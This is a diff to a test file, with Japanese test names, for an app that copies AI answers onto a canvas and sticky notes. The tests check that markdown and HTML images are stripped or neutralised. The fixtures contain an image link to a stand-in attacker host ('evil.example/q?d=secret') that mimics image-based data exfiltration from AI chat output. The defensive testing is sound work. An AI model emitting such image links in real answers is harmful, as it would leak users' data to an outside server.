@@ -442,14 +442,15 @@ describe('copying an answer to the canvas', () => {
     expect(text).not.toContain('![')
     expect(text).not.toContain('<img')
     expect(text).toContain(plain)
-    expect(text).toContain('画像「図」（https://evil.example/q?d=secret）')
+    // 生の HTML は、タグの < > を全角にして、ただの文字にする
+    expect(text).toContain('＜img src="https://evil.example/q?d=secret" alt="図"＞')
   })
 
   it('付箋に添える答えの写し（付箋に切り出す・続けて聞く）にも、画像を写さない。質問の文はそのまま', () => {
     const context = chatContext({ threadId: 't1', jobId: 'j1', title: '題', question: `質問 ${image}`, answer, previous: [{ question: 'Q', answer: image }] })
     expect(context.turns).toEqual([
       { question: 'Q', answer: plain },
-      { question: `質問 ${image}`, answer: `答えです。\n\n${plain}\n\n画像「図」（https://evil.example/q?d=secret）` },
+      { question: `質問 ${image}`, answer: `答えです。\n\n${plain}\n\n＜img src="https://evil.example/q?d=secret" alt="図"＞` },
     ])
     const meta = { contexts: [], answer: { body: answer, related: [], model: 'm', question: 'Q2', answeredAt: 1 } }
     expect(followUpContext('node:me', 'canvas:me', meta)!.turns.at(-1)!.answer).not.toContain('![')
